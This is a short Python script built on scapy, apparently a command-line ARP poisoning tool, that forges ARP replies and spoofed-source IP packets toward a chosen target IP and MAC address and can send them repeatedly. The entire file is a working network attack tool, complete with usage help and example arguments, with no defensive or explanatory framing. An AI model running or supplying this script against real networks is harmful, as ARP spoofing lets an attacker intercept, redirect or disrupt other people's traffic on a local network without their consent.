from argparse import ArgumentParser
from scapy.all import *
import random
#import re

def main():
    parser = ArgumentParser()
    parser.add_argument('--target-ip', '-ti', help='Target IP address')
    parser.add_argument('--target-mac', '-tm', help='Target MAC address')
    parser.add_argument('--fake-ip', '-fi', help='Fake / Spoofed IP address')
    parser.add_argument('--fake-mac', '-fm', help='Fake / Spoofed MAC address')
    parser.add_argument('--count', '-c', help='Number of packets')
    parser.add_argument('--version','-v', action='version', version='ARP_Poisoning_CMD v1.1')
    parser.epilog = "Usage: python arp_poisoning.py -ti <target_ip> -tm <target_mac> -fi <fake_ip> -fm <fake_mac> -c <count>"

    args = parser.parse_args()
    
    #pattern = re.compile("([0-9a-fA-F]{2}[:]){5}([0-9a-fA-F]{2})")

    # Checks for any missing arguments
    if args.target_ip is None or args.target_mac is None or args.fake_ip is None or args.fake_mac is None:
        # print('[-]Please, use --fake-mac or -fm to set a fake MAC address!')
        # print('[!]Example: -fm aa:bb:cc:11:22:33')
        # print('[?] -h for help')
        parser.print_help()
        print('''\nusage: arp_poisoning_cmd.py [-h] [--target-ip TARGET_IP]
                            [--target-mac TARGET_MAC] [--fake-ip FAKE_IP]
                            [--fake-mac FAKE_MAC] [--count COUNT] [--version]
optional arguments:
  -h, --help            Show this help message and exit
  --target-ip TARGET_IP, -ti TARGET_IP
                        Target IP address, x.x.x.x
  --target-mac TARGET_MAC, -tm TARGET_MAC
                        Target MAC address, xx:xx:xx:xx:xx:xx
  --fake-ip FAKE_IP, -fi FAKE_IP
                        Fake / Spoofed IP address, y.y.y.y
  --fake-mac FAKE_MAC, -fm FAKE_MAC
                        Fake / Spoofed MAC address, yy:yy:yy:yy:yy:yy
  --count COUNT, -c COUNT
                        Number of packets
  --version, -v         Show program's version number and exit
Usage: python3 arp_poisoning_cmd.py -ti 10.20.30.40 -tm 11:22:33:aa:bb:cc -fi
10.20.30.41 -fm aa:bb:cc:11:22:33 -c 10''')
        sys.exit(1)
    
    else:
        arpPacket = ARP()   # Initialise ARP Packet
        icmpPacket = IP()   # Initialise ICMP Packet
        
        # Setting Destination IPs (using Target IP)
        arpPacket.pdst = args.target_ip
        icmpPacket.dst = args.target_ip
        
        # Setting Destination Hardware / Physical Address (with Target's)
        arpPacket.hwdst = args.target_mac
        
        # Setting (Spoofed) Source IPs
        arpPacket.psrc = args.fake_ip
        icmpPacket.src = args.fake_ip
        
        # Setting (Spoofed) Source MAC Address 
        arpPacket.hwsrc = args.fake_mac

        # If Counter parameter (-c <amount>) was not set, only send packet once
        if args.count is None:
                print('[!]Counter parameter not set, sending 1 packet only..')
                send(icmpPacket)
                send(arpPacket)
        
        # Else, do a FOR Loop based on the amount specified
        else:
            for i in range(int(args.count)):
                send(icmpPacket)
                send(arpPacket)

main()
sys.exit(0)
